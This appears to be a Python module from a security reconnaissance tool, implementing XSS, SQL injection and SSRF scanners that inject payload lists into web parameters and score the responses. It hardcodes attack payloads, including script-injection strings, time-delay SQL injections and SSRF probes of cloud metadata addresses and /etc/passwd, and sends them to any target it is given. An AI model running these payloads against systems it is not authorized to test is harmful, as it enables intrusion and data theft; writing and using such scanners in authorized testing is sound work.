"""
Class-specific vulnerability scanners for XSS, SQLi, SSRF, IDOR, and other vulnerabilities.

This module implements specialized scanners for different vulnerability classes
with advanced detection techniques and payload optimization.
"""

import asyncio
import logging
import re
import json
import base64
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple, Union
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
from bs4 import BeautifulSoup

from recon.collectors import BaseCollector


logger = logging.getLogger(__name__)


class VulnerabilityScanner:
    """Base class for vulnerability scanners."""
    
    def __init__(self, vuln_type: str):
        self.vuln_type = vuln_type
        self.payloads = self._load_payloads()
        self.detection_patterns = self._load_detection_patterns()
    
    def _load_payloads(self) -> List[str]:
        """Load vulnerability-specific payloads."""
        return []
    
    def _load_detection_patterns(self) -> List[str]:
        """Load detection patterns."""
        return []
    
    async def scan_parameter(self, url: str, method: str, param_name: str,
                           original_value: str = '') -> List[Dict[str, Any]]:
        """Scan parameter for vulnerabilities."""
        return []


class XSSScanner(VulnerabilityScanner):
    """XSS vulnerability scanner."""
    
    def __init__(self):
        super().__init__('xss')
    
    def _load_payloads(self) -> List[str]:
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '{{alert(1)}}',
            '${alert(1)}',
            '<script>alert`1`</script>',
            '<details open ontoggle=alert(1)>'
        ]
    
    def _load_detection_patterns(self) -> List[str]:
        return [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'onerror\s*=',
            r'onload\s*=',
            r'alert\s*\('
        ]
    
    async def scan_parameter(self, url: str, method: str, param_name: str,
                           original_value: str = '') -> List[Dict[str, Any]]:
        """Scan for XSS vulnerabilities."""
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            
            for payload in self.payloads:
                try:
                    # Test payload
                    if method.upper() == 'GET':
                        parsed_url = urlparse(url)
                        query_params = parse_qs(parsed_url.query)
                        query_params[param_name] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(query_params, doseq=True)}"
                        
                        async with session.get(test_url) as response:
                            content = await response.text()
                    
                    elif method.upper() == 'POST':
                        data = {param_name: payload}
                        async with session.post(url, data=data) as response:
                            content = await response.text()
                    else:
                        continue
                    
                    # Check for XSS
                    if payload in content:
                        confidence = 0.3
                        indicators = []
                        
                        for pattern in self.detection_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                indicators.append(pattern)
                                confidence += 0.3
                        
                        if confidence >= 0.5:
                            vulnerabilities.append({
                                'vulnerability_type': 'xss',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'confidence': min(confidence, 1.0),
                                'indicators': indicators,
                                'timestamp': datetime.utcnow().isoformat()
                            })
                
                except Exception as e:
                    logger.debug(f"XSS scan error: {e}")
                    continue
        
        return vulnerabilities


class SQLiScanner(VulnerabilityScanner):
    """SQL injection scanner."""
    
    def __init__(self):
        super().__init__('sqli')
    
    def _load_payloads(self) -> List[str]:
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
            "' UNION SELECT 1,2,3--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)='",
            "' AND 1=1--",
            "' AND 1=2--"
        ]
    
    def _load_detection_patterns(self) -> List[str]:
        return [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'PostgreSQL.*ERROR',
            r'ORA-\d{5}',
            r'Microsoft OLE DB Provider',
            r'Incorrect syntax near'
        ]
    
    async def scan_parameter(self, url: str, method: str, param_name: str,
                           original_value: str = '') -> List[Dict[str, Any]]:
        """Scan for SQL injection vulnerabilities."""
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            
            for payload in self.payloads:
                try:
                    start_time = asyncio.get_event_loop().time()
                    
                    if method.upper() == 'GET':
                        parsed_url = urlparse(url)
                        query_params = parse_qs(parsed_url.query)
                        query_params[param_name] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(query_params, doseq=True)}"
                        
                        async with session.get(test_url) as response:
                            content = await response.text()
                            response_time = asyncio.get_event_loop().time() - start_time
                    
                    elif method.upper() == 'POST':
                        data = {param_name: payload}
                        async with session.post(url, data=data) as response:
                            content = await response.text()
                            response_time = asyncio.get_event_loop().time() - start_time
                    else:
                        continue
                    
                    # Check for SQL injection
                    confidence = 0.0
                    indicators = []
                    
                    # Error-based detection
                    for pattern in self.detection_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            indicators.append(f"SQL error: {pattern}")
                            confidence += 0.4
                    
                    # Time-based detection
                    if response_time >= 5:
                        indicators.append(f"Time delay: {response_time:.2f}s")
                        confidence += 0.6
                    
                    if confidence >= 0.4:
                        vulnerabilities.append({
                            'vulnerability_type': 'sqli',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'confidence': min(confidence, 1.0),
                            'indicators': indicators,
                            'response_time': response_time,
                            'timestamp': datetime.utcnow().isoformat()
                        })
                
                except Exception as e:
                    logger.debug(f"SQLi scan error: {e}")
                    continue
        
        return vulnerabilities


class SSRFScanner(VulnerabilityScanner):
    """SSRF vulnerability scanner."""
    
    def __init__(self):
        super().__init__('ssrf')
    
    def _load_payloads(self) -> List[str]:
        return [
            'http://localhost',
            'http://127.0.0.1',
            'http://169.254.169.254',
            'http://metadata.google.internal',
            'file:///etc/passwd',
            'file:///etc/hosts',
            'gopher://127.0.0.1:80',
            'http://localtest.me',
            'http://2130706433'
        ]
    
    async def scan_parameter(self, url: str, method: str, param_name: str,
                           original_value: str = '') -> List[Dict[str, Any]]:
        """Scan for SSRF vulnerabilities."""
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            
            for payload in self.payloads:
                try:
                    if method.upper() == 'GET':
                        parsed_url = urlparse(url)
                        query_params = parse_qs(parsed_url.query)
                        query_params[param_name] = [payload]
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(query_params, doseq=True)}"
                        
                        async with session.get(test_url) as response:
                            content = await response.text()
                    
                    elif method.upper() == 'POST':
                        data = {param_name: payload}
                        async with session.post(url, data=data) as response:
                            content = await response.text()
                    else:
                        continue
                    
                    # Check for SSRF indicators
                    confidence = 0.0
                    indicators = []
                    
                    if 'ami-id' in content or 'instance-id' in content:
                        indicators.append("AWS metadata exposed")
                        confidence += 0.8
                    
                    if 'root:' in content and ':0:0:' in content:
                        indicators.append("File system access")
                        confidence += 0.9
                    
                    if any(err in content.lower() for err in ['connection refused', 'timeout']):
                        indicators.append("Network error detected")
                        confidence += 0.4
                    
                    if confidence >= 0.4:
                        vulnerabilities.append({
                            'vulnerability_type': 'ssrf',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'confidence': min(confidence, 1.0),
                            'indicators': indicators,
                            'timestamp': datetime.utcnow().isoformat()
                        })
                
                except Exception as e:
                    logger.debug(f"SSRF scan error: {e}")
                    continue
        
        return vulnerabilities


class VulnerabilityScannerCollector(BaseCollector):
    """Comprehensive vulnerability scanner collector."""
    
    def __init__(self):
        super().__init__("vulnerability_scanner")
        self.scanners = {
            'xss': XSSScanner(),
            'sqli': SQLiScanner(),
            'ssrf': SSRFScanner()
        }
    
    async def collect(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Run comprehensive vulnerability scanning."""
        
        endpoints = kwargs.get('endpoints', [])
        vuln_types = kwargs.get('vulnerability_types', ['xss', 'sqli', 'ssrf'])
        
        if not endpoints:
            endpoints = self._get_default_endpoints(target)
        
        # Scan each endpoint
        for endpoint in endpoints:
            url = endpoint.get('url', '')
            method = endpoint.get('method', 'GET')
            parameters = endpoint.get('parameters', [])
            
            for param_name in parameters:
                for vuln_type in vuln_types:
                    if vuln_type in self.scanners:
                        try:
                            scanner = self.scanners[vuln_type]
                            vulnerabilities = await scanner.scan_parameter(
                                url, method, param_name
                            )
                            
                            for vuln in vulnerabilities:
                                self.add_result({
                                    'type': 'vulnerability_found',
                                    'target': target,
                                    'vulnerability': vuln
                                })
                        
                        except Exception as e:
                            logger.error(f"Scanner error for {vuln_type}: {e}")
                            continue
        
        return self.results
    
    def _get_default_endpoints(self, target: str) -> List[Dict[str, Any]]:
        """Get default endpoints for testing."""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        return [
            {'url': target, 'method': 'GET', 'parameters': ['id', 'user', 'search']},
            {'url': f"{target}/search", 'method': 'GET', 'parameters': ['q', 'query']},
            {'url': f"{target}/api/users", 'method': 'GET', 'parameters': ['id', 'limit']}
        ]


# Standalone usage
if __name__ == "__main__":
    async def test_vulnerability_scanner():
        collector = VulnerabilityScannerCollector()
        
        test_endpoints = [
            {'url': 'https://httpbin.org/get', 'method': 'GET', 'parameters': ['test_param']}
        ]
        
        results = await collector.collect(
            "https://httpbin.org",
            endpoints=test_endpoints,
            vulnerability_types=['xss', 'sqli', 'ssrf']
        )
        
        print(f"Vulnerability scanning completed with {len(results)} results")
        for result in results[:5]:
            print(f"- {result.get('type')}: {result}")
    
    asyncio.run(test_vulnerability_scanner())
